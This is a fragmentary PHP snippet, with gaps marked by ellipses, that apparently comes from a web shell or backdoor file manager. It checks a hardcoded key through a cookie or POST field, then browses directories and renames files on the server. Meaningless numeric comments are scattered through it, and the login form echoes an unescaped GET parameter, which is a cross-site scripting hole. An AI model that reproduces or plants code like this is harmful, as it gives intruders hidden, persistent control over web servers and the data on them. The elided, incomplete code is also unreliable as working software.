...
$auth_key = "340f5ecc00d0b292ac6ef66f9bfca311";
...
$pass = false;
if (isset($_COOKIE['pw_name_76482'])) {
    if(($_COOKIE['pw_name_76482']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_76482'])) {
        if(($_POST['pw_name_76482']) == $auth_key) {
            setcookie("pw_name_76482", $_POST['pw_name_76482']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_76482' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1720852318119675 1720852318419203 1720852318458223 1720852318552981
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
            $name = PATH . "/" . $_GET['r'];
